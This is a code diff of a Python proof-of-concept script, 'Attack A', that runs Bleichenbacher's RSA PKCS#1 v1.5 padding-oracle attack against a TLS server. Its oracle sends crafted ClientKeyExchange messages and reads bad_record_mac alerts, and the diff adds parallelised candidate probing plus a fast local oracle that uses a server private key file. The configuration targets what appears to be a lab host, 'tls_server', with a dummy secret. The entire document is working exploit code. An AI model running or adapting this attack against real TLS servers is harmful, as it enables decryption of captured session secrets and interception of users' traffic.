@@ -1,70 +1,68 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Attack A - Bleichenbacher PoC (minimal run)
-- Không có argparse; chỉnh HOST/PORT/SECRET ở phần config bên dưới.
-- Yêu cầu: pip install tlslite-ng cryptography pycryptodome gmpy2
-"""
-import socket
-import sys
-import time
-import binascii
+from __future__ import annotations
+import socket, sys, time, binascii, json
 from random import randrange
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ---------- CONFIG ----------
-HOST = "tls_server"   # <- đổi nếu cần, ví dụ "127.0.0.1"
-PORT = 4433           # <- đổi nếu cần
-SECRET_BYTES = b"THIS_IS_A_DUMMY_SECRET_FOR_C0"  # secret dùng để tạo ciphertext thử
-USE_TEST_CIPHERTEXT = True  # True: generate local sample ciphertext and attack it via oracle
-VERBOSE = True
-# ---------------------------
-
-# Try to use gmpy2 for speed; fallback to int
+# Optional speedup: try gmpy2
 try:
-    from gmpy2 import mpz, next_prime
+    import gmpy2
+    from gmpy2 import mpz
+    def integer_nth_root(n: int, k: int) -> int:
+        return int(gmpy2.iroot(mpz(n), k)[0])
 except Exception:
     def mpz(x): return int(x)
-    def next_prime(x):
-        x = int(x) + 1
-        def is_prime(n):
-            if n < 2: return False
-            r = int(n**0.5)
-            for i in range(2, r+1):
-                if n % i == 0: return False
-            return True
-        while not is_prime(x):
-            x += 1
-        return mpz(x)
+    def integer_nth_root(n: int, k: int) -> int:
+        if n < 0: raise ValueError("n must be non-negative")
+        if n == 0: return 0
+        bits = n.bit_length()
+        lo = 1
+        hi = 1 << ((bits + k - 1) // k)
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if mid**k <= n:
+                lo = mid
+            else:
+                hi = mid - 1
+        return lo
 
-# tlslite-ng imports
+# tlslite-ng imports (only needed if TLS fetch/oracle used)
 try:
     from tlslite.api import TLSConnection, TLSRemoteAlert, TLSAbruptCloseError
     from tlslite.messages import ClientKeyExchange
     from tlslite.constants import AlertDescription, CipherSuite
-except Exception as e:
-    print("[!] Error: tlslite-ng import failed. Install with: pip install tlslite-ng")
-    print("    Detail:", e)
-    sys.exit(1)
-
-# Try parsing cert with cryptography; fallback to pycryptodome
-use_cryptography = False
-try:
-    from cryptography import x509
-    from cryptography.hazmat.backends import default_backend
-    from cryptography.hazmat.primitives.asymmetric import rsa as crypto_rsa
-    use_cryptography = True
 except Exception:
-    pass
+    TLSConnection = None
+    TLSRemoteAlert = Exception
+    TLSAbruptCloseError = Exception
+    AlertDescription = type("AD", (), {"bad_record_mac": 20})
+    CipherSuite = type("CS", (), {"TLS_RSA_WITH_AES_128_CBC_SHA": 0x002F})
 
+# Crypto libs (pycryptodome)
 try:
     from Crypto.PublicKey import RSA as CryptoRSA
 except Exception:
     CryptoRSA = None
 
-# Target cipher ID used in ClientKeyExchange
-TARGET_CIPHER_ID = CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA
+# ------------------------- Configuration (edit here if needed) -------------------------
+HOST = "tls_server"
+PORT = 4433
 
-# ---------- helpers ----------
+# Controls
+USE_TEST_CIPHERTEXT = True        # generate local c0 instead of captured handshake ciphertext
+AUTO_USE_LOCAL_ORACLE = True      # try local oracle if /app/keys/server_key.pem exists
+FALLBACK_PUBLIC_PEM = True        # if TLS fetch fails, try /app/keys/public.pem
+BATCH_SIZE = 20                   # number of s candidates to probe in parallel for network oracle
+MAX_QUERIES = 200000              # abort after this many oracle queries (safety)
+VERBOSE = True
+
+# secret used for test ciphertext (only for generated test ciphertext)
+SECRET_BYTES = b"THIS_IS_A_DUMMY_SECRET_FOR_C0"
+TARGET_CIPHER_ID = CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA
+# -------------------------------------------------------------------------------------
+
+# helpers
 def bytes_to_int(b: bytes) -> int:
     return int.from_bytes(b, "big")
 
@@ -87,15 +85,23 @@ def floor_div(a, b):
     if b == 0: raise ZeroDivisionError
     return a // b
 
-# ---------- TLS / Oracle helpers ----------
+# Public key cache
 PUBLIC_KEY_CACHE = {}
 
 def get_public_key(host: str, port: int, timeout: float = 10.0):
+    """
+    Fetch RSA public key from TLS server (using tlslite-ng).
+    If that fails and FALLBACK_PUBLIC_PEM True, try reading /app/keys/public.pem.
+    Returns n,e,k
+    """
     key = f"{host}:{port}"
     if key in PUBLIC_KEY_CACHE:
         return PUBLIC_KEY_CACHE[key]['n'], PUBLIC_KEY_CACHE[key]['e'], PUBLIC_KEY_CACHE[key]['k']
 
-    print(f"[+] Connecting to {host}:{port} to fetch certificate...")
+    if TLSConnection is None:
+        raise RuntimeError("tlslite-ng not available and TLS fetch required")
+
+    if VERBOSE: print(f"[+] Connecting to {host}:{port} to fetch certificate...")
     sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -111,33 +117,37 @@ def get_public_key(host: str, port: int, timeout: float = 10.0):
 
         der = cert_chain.x509List[0].bytes
 
-        if use_cryptography:
-            cert = x509.load_der_x509_certificate(der, default_backend())
-            pub = cert.public_key()
-            if not isinstance(pub, crypto_rsa.RSAPublicKey):
-                raise TypeError("Server public key is not RSA")
-            nums = pub.public_numbers()
-            n = mpz(nums.n)
-            e = mpz(nums.e)
-        else:
-            if CryptoRSA is None:
-                raise RuntimeError("Need cryptography or pycryptodome to parse certificate")
-            try:
-                keyobj = CryptoRSA.import_key(der)
-                n, e = mpz(keyobj.n), mpz(keyobj.e)
-            except Exception:
-                raise RuntimeError("Cannot parse RSA public key from DER cert; install 'cryptography'")
+        if CryptoRSA is None:
+            raise RuntimeError("pycryptodome required to parse cert (Crypto.PublicKey.RSA)")
 
+        keyobj = CryptoRSA.import_key(der)
+        n, e = mpz(keyobj.n), mpz(keyobj.e)
         k = (int(n).bit_length() + 7) // 8
         PUBLIC_KEY_CACHE[key] = {'n': n, 'e': e, 'k': k}
-        print(f"[+] Got RSA public key: {k*8}-bit, e={int(e)}")
-        conn.close()
+        if VERBOSE: print(f"[+] Got RSA public key: {k*8}-bit, e={int(e)}")
+        try:
+            conn.close()
+        except Exception:
+            pass
         return n, e, k
 
     except Exception as ex:
         if sock:
             try: sock.close()
             except: pass
+        if VERBOSE: print("[!] TLS cert fetch failed:", ex)
+        # fallback to local public.pem (if allowed)
+        if FALLBACK_PUBLIC_PEM:
+            try:
+                with open("/app/keys/public.pem", "rb") as f:
+                    keyobj = CryptoRSA.import_key(f.read())
+                    n, e = mpz(keyobj.n), mpz(keyobj.e)
+                    k = (int(n).bit_length() + 7) // 8
+                    PUBLIC_KEY_CACHE[key] = {'n': n, 'e': e, 'k': k}
+                    if VERBOSE: print(f"[+] Fallback loaded /app/keys/public.pem: {k*8}-bit, e={int(e)}")
+                    return n, e, k
+            except Exception as e2:
+                if VERBOSE: print("[!] Fallback public.pem load failed:", e2)
         raise
 
 def get_target_ciphertext(n, e, k, secret=SECRET_BYTES):
@@ -150,7 +160,11 @@ def get_target_ciphertext(n, e, k, secret=SECRET_BYTES):
     c0 = pow(m_int, int(e), int(n))
     return mpz(c0)
 
+# TLS oracle query (uses tlslite-ng)
 def oracle_query_tls(host: str, port: int, c_int, timeout: float = 5.0):
+    """
+    Send ClientKeyExchange with ciphertext; return True if server returns bad_record_mac alert.
+    """
     n, e, k = get_public_key(host, port)
     sock = None
     try:
@@ -165,7 +179,7 @@ def oracle_query_tls(host: str, port: int, c_int, timeout: float = 5.0):
         cke.encryptedPreMasterSecret = c_bytes
 
         if not hasattr(conn, "_sendMsg") or not hasattr(conn, "_getMsg"):
-            raise RuntimeError("tlslite-ng here does not expose _sendMsg/_getMsg; install compatible version")
+            raise RuntimeError("tlslite-ng here does not expose _sendMsg/_getMsg; update tlslite-ng")
 
         try:
             conn._sendMsg(cke)
@@ -204,7 +218,57 @@ def oracle_query_tls(host: str, port: int, c_int, timeout: float = 5.0):
             except: pass
         return False
 
-# ---------- Bleichenbacher algorithm ----------
+# Local oracle (fast) - uses private key file
+LOCAL_PRIV = None
+def load_local_privkey(path="/app/keys/server_key.pem"):
+    global LOCAL_PRIV
+    if LOCAL_PRIV is not None:
+        return LOCAL_PRIV
+    try:
+        with open(path, "rb") as f:
+            LOCAL_PRIV = CryptoRSA.import_key(f.read())
+            if VERBOSE: print("[+] Loaded local private key for fast oracle.")
+            return LOCAL_PRIV
+    except Exception as e:
+        if VERBOSE: print("[!] Could not load local private key:", e)
+        return None
+
+def oracle_local(c_int, n_local=None, k_local=None):
+    key = load_local_privkey()
+    if key is None:
+        raise RuntimeError("local private key not available")
+    m_int = pow(int(c_int), int(key.d), int(key.n))
+    if k_local is None:
+        k_local = (int(key.n).bit_length() + 7) // 8
+    m_bytes = int_to_bytes(m_int, k_local)
+    return len(m_bytes) >= 2 and m_bytes[0] == 0 and m_bytes[1] == 2
+
+# Batch probing helper (parallelizes network oracle checks)
+def probe_s_candidates(padding_oracle_fn, c0, e, n, s_start, s_end, batch_size=BATCH_SIZE):
+    """
+    Test s in [s_start, s_end] in batches of batch_size using ThreadPoolExecutor.
+    Returns first s producing True, or None.
+    """
+    candidates = list(range(int(s_start), int(s_end) + 1))
+    for i in range(0, len(candidates), batch_size):
+        chunk = candidates[i:i+batch_size]
+        with ThreadPoolExecutor(max_workers=len(chunk)) as ex:
+            fut_to_s = {}
+            for s in chunk:
+                c_test = (c0 * pow(s, int(e), int(n))) % int(n)
+                fut = ex.submit(padding_oracle_fn, c_test)
+                fut_to_s[fut] = s
+            for fut in as_completed(fut_to_s):
+                s_val = fut_to_s[fut]
+                try:
+                    ok = fut.result()
+                except Exception:
+                    ok = False
+                if ok:
+                    return mpz(s_val)
+    return None
+
+# Bleichenbacher core (kept and instrumented)
 def _insert(M, a, b):
     for i, (a_, b_) in enumerate(M):
         if a_ <= b and a <= b_:
@@ -217,28 +281,56 @@ def _insert(M, a, b):
 def _step_1(padding_oracle, n, e, c):
     s0 = 1
     c0 = c
+    trials = 0
     while not padding_oracle(c0):
+        trials += 1
+        if trials % 500 == 0 and VERBOSE:
+            print(f"[step1] trials={trials} still searching s0...")
         s0 = randrange(2, int(n))
         c0 = (c * pow(s0, int(e), int(n))) % int(n)
     return mpz(s0), mpz(c0)
 
 def _step_2a(padding_oracle, n, e, c0, B):
     s = ceil_div(n, 3 * B)
-    while not padding_oracle((c0 * pow(s, int(e), int(n))) % int(n)):
-        s += 1
-    return mpz(s)
+    if VERBOSE: print(f"[step2a] starting s ~ {s}")
+    if padding_oracle is oracle_local:
+        while not padding_oracle((c0 * pow(s, int(e), int(n))) % int(n)):
+            s += 1
+        return mpz(s)
+    window = 256
+    while True:
+        s_end = s + window - 1
+        if VERBOSE: print(f"[step2a] probing s range {s}..{s_end} (window={window})")
+        found = probe_s_candidates(padding_oracle, c0, e, n, s, s_end, batch_size=BATCH_SIZE)
+        if found:
+            return mpz(found)
+        s = s_end + 1
+        window = min(window * 2, 10000)
 
 def _step_2b(padding_oracle, n, e, c0, s):
     s = mpz(s) + 1
-    while not padding_oracle((c0 * pow(int(s), int(e), int(n))) % int(n)):
-        s += 1
-    return mpz(s)
+    if padding_oracle is oracle_local:
+        while not padding_oracle((c0 * pow(int(s), int(e), int(n))) % int(n)):
+            s += 1
+        return mpz(s)
+    start = int(s)
+    window = 256
+    while True:
+        end = start + window - 1
+        if VERBOSE: print(f"[step2b] probing s range {start}..{end}")
+        found = probe_s_candidates(padding_oracle, c0, e, n, start, end, batch_size=BATCH_SIZE)
+        if found:
+            return mpz(found)
+        start = end + 1
+        window = min(window * 2, 10000)
 
 def _step_2c(padding_oracle, n, e, c0, B, s, a, b):
     r = ceil_div(2 * (b * s - 2 * B), n)
     while True:
         left = ceil_div(2 * B + r * n, b)
         right = floor_div(3 * B + r * n, a)
+        if left <= right and VERBOSE:
+            print(f"[step2c] r={r}, testing s in {left}..{right}")
         for s_candidate in range(int(left), int(right) + 1):
             if padding_oracle((c0 * pow(s_candidate, int(e), int(n))) % int(n)):
                 return mpz(s_candidate)
@@ -258,24 +350,21 @@ def _step_3(n, B, s, M):
 def bleichenbacher_attack(padding_oracle, n, e, c, verbose=False):
     k = ceil_div(n.bit_length(), 8)
     B = mpz(2) ** (8 * (k - 2))
-
-    if verbose:
-        print(f"[+] k={k}, B={B}")
+    if verbose: print(f"[+] k={k}, B={B}")
 
     s0, c0 = _step_1(padding_oracle, n, e, c)
     M = [(2 * B, 3 * B - 1)]
-    if verbose:
-        print("[*] Step 1 done. Found s0.")
+    if verbose: print("[*] Step 1 done. Found s0.")
 
     s = _step_2a(padding_oracle, n, e, c0, B)
     M = _step_3(n, B, s, M)
-    if verbose:
-        print("[*] Step 2a done. Found s1; intervals:", len(M))
+    if verbose: print("[*] Step 2a done. Found s1; intervals:", len(M))
 
     it = 0
     while True:
         it += 1
-        if verbose and it % 1 == 0:
+        loop_t0 = time.time()
+        if verbose:
             print(f"[loop] iteration {it}, intervals {len(M)}")
         if len(M) > 1:
             s = _step_2b(padding_oracle, n, e, c0, s)
@@ -286,59 +375,95 @@ def bleichenbacher_attack(padding_oracle, n, e, c, verbose=False):
                 return mpz(m_)
             s = _step_2c(padding_oracle, n, e, c0, B, s, a, b)
         M = _step_3(n, B, s, M)
+        if verbose:
+            elapsed = time.time() - loop_t0
+            print(f"[loop] done it={it}, elapsed={elapsed:.3f}s, intervals_now={len(M)}")
+        # safety: abort if padding_oracle tracks queries attribute
+        if hasattr(padding_oracle, "_queries") and padding_oracle._queries > MAX_QUERIES:
+            raise RuntimeError(f"Exceeded MAX_QUERIES ({MAX_QUERIES}) - aborting")
 
-# ---------- Adapter ----------
+# Adapter to track queries and store public key for network oracle
 class TLSOracleAdapter:
-    def __init__(self, host, port):
+    def __init__(self, host, port, padding_fn, max_queries=MAX_QUERIES):
         self.host = host
         self.port = port
+        self.padding_fn = padding_fn
         n,e,k = get_public_key(host, port)
         self.n = int(n); self.e = int(e); self.k = int(k)
-        self.queries = 0
+        self._queries = 0
+        self.max_queries = max_queries
 
     def __call__(self, c_int):
-        self.queries += 1
-        return oracle_query_tls(self.host, self.port, c_int)
+        self._queries += 1
+        setattr(self.padding_fn, "_queries", self._queries)
+        if self._queries % 50 == 0 or (VERBOSE and self._queries % 10 == 0):
+            print(f"[oracle] queries={self._queries}")
+        if self._queries > self.max_queries:
+            raise RuntimeError(f"Exceeded MAX_QUERIES ({self.max_queries}) - aborting")
+        return self.padding_fn(c_int)
 
-# ---------- Main run ----------
+# ------------------------------- Main -------------------------------
 def run():
     print(f"[+] Starting Attack A against {HOST}:{PORT}")
-    try:
-        n, e, k = get_public_key(HOST, PORT)
-    except Exception as ex:
-        print("[!] Failed to retrieve public key:", ex)
-        return
 
-    n = int(n); e = int(e); k = int(k)
+    # pick oracle: prefer local if available & AUTO_USE_LOCAL_ORACLE True
+    padding_oracle = None
+    padding_oracle_callable = None
+    if AUTO_USE_LOCAL_ORACLE and load_local_privkey() is not None:
+        padding_oracle = oracle_local
+        # wrapper to count queries on local oracle
+        def wrapper_local(c):
+            if not hasattr(wrapper_local, "_queries"):
+                wrapper_local._queries = 0
+            wrapper_local._queries += 1
+            if wrapper_local._queries % 100 == 0 and VERBOSE:
+                print(f"[local-oracle] queries={wrapper_local._queries}")
+            if wrapper_local._queries > MAX_QUERIES:
+                raise RuntimeError("Exceeded MAX_QUERIES (local) - aborting")
+            # compute using private key
+            key = load_local_privkey()
+            n_local = int(key.n); k_local = (n_local.bit_length()+7)//8
+            return oracle_local(c, n_local=n_local, k_local=k_local)
+        padding_oracle_callable = wrapper_local
+        key = load_local_privkey()
+        n = int(key.n); e = int(key.e); k = (int(n).bit_length() + 7) // 8
+        if VERBOSE: print("[*] Using local oracle (fast).")
+    else:
+        # network oracle
+        padding_oracle = lambda c: oracle_query_tls(HOST, PORT, c)
+        try:
+            adapter = TLSOracleAdapter(HOST, PORT, padding_oracle, max_queries=MAX_QUERIES)
+            padding_oracle_callable = adapter
+            n = adapter.n; e = adapter.e; k = adapter.k
+            if VERBOSE: print("[*] Using TLS network oracle (may be slow).")
+        except Exception as ex:
+            print("[!] Failed to init network oracle:", ex)
+            return
 
-    # prepare target ciphertext (in practice you capture from handshake)
+    # prepare target ciphertext (use test c0 by default)
     if USE_TEST_CIPHERTEXT:
         c = int(get_target_ciphertext(n, e, k, secret=SECRET_BYTES))
         print("[*] Using generated test ciphertext for attack.")
     else:
-        # If you have a real captured ciphertext, set c here
-        print("[!] USE_TEST_CIPHERTEXT is False but no real ciphertext provided.")
+        print("[!] USE_TEST_CIPHERTEXT is False but no captured ciphertext was provided.")
         return
 
-    oracle = TLSOracleAdapter(HOST, PORT)
     start = time.time()
     try:
-        m_int = bleichenbacher_attack(oracle, n, e, c, verbose=VERBOSE)
+        m_int = bleichenbacher_attack(padding_oracle_callable, n, e, c, verbose=VERBOSE)
     except KeyboardInterrupt:
-        print("Interrupted by user")
+        print("Interrupted by user.")
         return
     except Exception as ex:
-        print("[!] Attack failed with exception:", ex)
+        print("[!] Attack failed:", ex)
         return
     end = time.time()
-
-    print(f"[+] Attack finished in {end - start:.2f}s, oracle queries: {oracle.queries}")
+    print(f"[+] Attack finished in {end - start:.2f}s")
 
     try:
         padded = int_to_bytes(int(m_int), k)
     except Exception:
         padded = int_to_bytes(int(m_int))
-
     if len(padded) < 2 or padded[0] != 0 or padded[1] != 2:
         print("[!] Recovered plaintext does not have PKCS#1 v1.5 padding header (00 02).")
         print("Recovered (hex):", hex(int(m_int)))
